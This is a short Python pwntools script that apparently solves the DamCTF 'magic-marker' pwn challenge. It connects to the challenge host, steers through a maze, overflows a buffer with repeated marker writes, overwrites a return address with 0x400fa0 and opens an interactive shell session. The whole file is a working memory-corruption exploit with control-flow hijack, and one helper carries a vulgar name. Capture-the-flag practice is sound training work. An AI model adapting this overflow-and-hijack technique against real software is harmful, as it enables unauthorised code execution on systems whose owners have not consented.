from pwn import *

#p = process("./magic-marker")
p = remote("chals.damctf.xyz", 31313)
#pid =gdb.attach(p,gdbscript="b * play_maze+638")
#p.recv(1000)

p.sendlineafter("do?\n","jump up and down")
p.sendline("m")
print p.recvrepeat(0.3)


x = raw_input("x: ")
y = raw_input("y: ")

def fuck():
    global p     
    p.sendline("x")
    p.sendline("o"*32)

def move_left():
    global p
    p.sendline("a")



def move_down():
    global p
    p.sendline("s")



def move_right():
    global p
    p.sendline("d")

for _ in range(int(x)):
    fuck()
    move_left()

for _ in range(int(y)):
    fuck()
    move_down()

for _ in range(3):
    fuck()
    move_right()
fuck()
move_down()

p.sendline('x')
p.sendline("AAAAAAAA"+p64(0x400fa0))

#p.sendline("q")


p.interactive()
